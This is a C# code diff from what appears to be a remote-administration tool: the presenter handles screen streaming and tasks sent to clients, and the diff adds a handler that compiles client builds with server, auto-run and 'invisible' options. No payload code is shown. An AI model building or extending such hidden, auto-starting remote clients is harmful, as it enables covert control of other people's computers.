@@ -25,6 +25,7 @@ namespace networkWork.presenter
             mW.streamStart += startStreem;
             mW.sendInfo += MW_sendInfo;
             mW.ipEvent += MW_ipEvent;
+            mW.compile += MW_compile; ;
             taskStream.message += mW.message;
 
             vS.listenSocets(10);
@@ -42,7 +43,7 @@ namespace networkWork.presenter
                            mW.message(GO.parceIP(value), "IP");
                            break;
                        case ipMode.getCurentIp:
-                           mW.message(GO.parceIP("https://www.whatismyip.org", "<a href=\"/my-ip-address\">(.*)</a></h3>"), "Curent IP");
+                           mW.message(GO.parceIP("https://2ip.ru", "<big id=\"d_clip_button\">(.*)</big>"), "Curent IP");
                            break;
                        case ipMode.getDomain:
                            mW.message(GO.getDomain(), "Domain");
@@ -77,6 +78,19 @@ namespace networkWork.presenter
             sW.streamId = vS.startStreaming(client, sW.drawing);
             sW.buttonTask += vS.sendTask;
             sW.closeWindow += vS.stopStreaming;
+        }
+
+        private void MW_compile(compileMode mode, string server, bool autoRun, bool invise, string path)
+        {
+            try
+            {
+                clientCompiler.compile(mode, server, autoRun, invise, path);
+                mW.message("Сompile successfully :)", "Сompile!");
+            }
+            catch(Exception e)
+            {
+                mW.message($"{e.Message} :(", "Error!");
+            }
         }
     }
 }
